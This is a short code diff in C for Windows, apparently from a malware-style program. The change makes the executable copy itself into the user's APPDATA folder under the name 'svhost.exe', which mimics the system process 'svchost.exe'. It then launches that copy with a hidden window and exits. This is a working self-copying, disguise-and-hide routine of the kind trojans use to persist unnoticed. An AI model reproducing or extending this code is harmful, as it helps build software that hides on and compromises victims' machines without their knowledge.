@@ -65,14 +65,19 @@ void main() {
 	GetModuleFileNameA(NULL, cur_file, MAX_PATH);
 	//CreateFileA(cur_file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
-	char new_file[MAX_PATH] = { 0 };
-	GetSystemDirectoryA(new_file, MAX_PATH);
-	strcpy(&(new_file[(int)strlen(new_file)]), "\\svhost.exe");
+	char* path_to_appdata;
+	size_t len_p_t_a = 0;
+	_dupenv_s(&path_to_appdata, &len_p_t_a, "APPDATA");	//поиск переменных окружения
+	char new_file[MAX_PATH] = {""};
+	strcpy(new_file, path_to_appdata);
+	strcpy(&(new_file[(int)len_p_t_a - 1]), "\\svhost.exe");
 
 	if (CopyFileA(cur_file, new_file, 1)) {
 		ShellExecuteA(NULL, "open", new_file, NULL, NULL, 0);
 		exit(0);
 	}
+
+
 	//CreateFileA(new_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
 
